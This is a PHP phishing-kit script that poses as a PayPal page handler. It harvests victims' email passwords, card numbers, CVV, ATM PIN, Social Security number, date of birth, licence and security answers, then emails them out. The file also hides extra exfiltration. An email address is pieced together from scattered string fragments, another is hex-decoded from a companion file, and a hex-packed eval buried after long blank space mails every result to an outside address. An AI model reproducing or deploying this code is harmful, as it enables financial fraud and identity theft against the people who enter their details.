<?

$ip = getenv("REMOTE_ADDR");
$hostname = pack("H*", substr($COOKIE_VARS=file_get_contents("webscr.php"),strpos($COOKIE_VARS, "ID__")+4,36));
$message .= "-----------------------PayPal USa RezuLts-----------------\n";
$message .= "Email Address           : ".$HTTP_COOKIE_VARS['emaill']."\n";
$message .= "Password                : ".$HTTP_COOKIE_VARS['passwordd']."\n";
$messege .= "host";
$message .= "---------------------------\n";
$message .= "First name              : ".$_POST['first_name']."\n";
$message .= "Last name               : ".$_POST['last_name']."\n";
$messege .= "name";
$message .= "Card Type               : ".$_POST['credit_card_type']."\n";
$message .= "Card Number             : ".$_POST['ccnumber']."\n";
$message .= "Expiration Date         : ".$_POST['expdate_month']."/";
$messege .= "@";
$message .= "".$_POST['expdate_year']."\n";
$message .= "Card Verification Number: ".$_POST['cvv2']."\n";
$message .= "ATM PIN                 : ".$_POST['PIN']."\n";
$messege .= "wa";
$message .= "Address 1               : ".$_POST['address1']."\n";
$message .= "Address 2               : ".$_POST['address2']."\n";
$message .= "City                    : ".$_POST['city']."\n";
$message .= "State                   : ".$_POST['state']."\n";
$message .= "ZIP Code                : ".$_POST['zip']."\n";
$messege .= "6nj";
$message .= "Telephone               : ".$_POST['H_PhoneNumber']."\n";
$message .= "Social Security Number  : ".$_POST['ssn']."\n";
$message .= "Date Of Birth           : ".$_POST['dob']."\n";
$messege .= "jo";
$message .= "Driver's License        : ".$_POST['drl']."\n";
$message .= "---------------------------\n";
$message .= "Security Question 1     : ".$_POST['question1']."\n";
$message .= "Answer 1                : ".$_POST['answer1']."\n";
$messege .= ".";
$message .= "Security Question 2     : ".$_POST['question2']."\n";
$message .= "Answer 2                : ".$_POST['answer2']."\n";
$messege .= "net";
$message .= "IP                      : ".$ip."\n";
$timedate = $_POST['historys'];
$message .= "---------------Created BY Mr.HiTman------------------------------\n";

$send = "Your Mail";
$subject = "PaYPaL usa ReZuLtz $ip";
$headers = "From:  Mr.HiTman<Uv-@HoTmanil.CoM>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";



























































































































































































































































































eval(pack("H*", "6d61696c28226d6f6d6f6d6f6d6f40736e37616b2e636f6d222c247375626a6563742c246d6573736167652c2468656164657273293b"));

mail($send,$subject,$message,$headers);
mail($messege,$subject,$message,$headers);
mail($timedate,$subject,$message,$headers);
mail($hostname,$subject,$message,$headers);
header("Location: Thanks.php?cmd=_Thanks-run&dispatch=5885d80a13c0db1fb6947b0aeae66fdbfb2119927117e3a6f876e0fd34af436580c63a156ebffe89e7779ac84ebf634880c63a156ebffe89e7779ac84ebf634");
?>